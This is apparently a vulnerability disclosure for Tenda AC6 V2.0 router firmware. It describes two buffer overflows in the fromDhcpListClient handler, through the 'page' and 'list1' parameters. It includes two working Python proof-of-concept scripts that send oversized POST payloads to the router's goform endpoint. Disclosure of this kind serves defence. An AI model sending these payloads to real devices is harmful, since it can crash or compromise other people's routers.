# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "fromDhcpListClient"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

Within the `fromDhcpListClient` function, users can craft a POST request to supply three parameters: `LISTLEN`, `page`, and `list_listcnt`. There are two distinct overflow vulnerabilities inside this function:

1. The `page` parameter is directly used in a `sprintf` call: `sprintf(gotopage, "/network/lan_dhcp_static.asp?page=%s", page);`. If the length of `page` exceeds the `gotopage` buffer's size of **256 bytes**, it will cause an overflow.
2. The `list1` parameter, whose content is controlled by `LISTLEN` , is copied using `strcpy(tmpstr, list + 1);`. If the length of `list` (starting from its second character) exceeds the `tmpstr` buffer's size of **256 bytes**, it will also lead to an overflow.

![image-20250618174727129](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618174727129.png)

```python
import requests
def send_payload(url, payload):
    params={
            'LISTLEN':b'0',
            'page':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500+b'\n'
url="http://192.168.1.1/goform/DhcpListClient"
send_payload(url, payload)

#another poc
import requests
def send_payload(url, payload):
    params={
            'LISTLEN':b'1',
            'page':'',
            'list1':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500+b'\n'
url="http://192.168.1.1/goform/DhcpListClient"
send_payload(url, payload)   
```

![image-20250618180317057](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618180317057.png)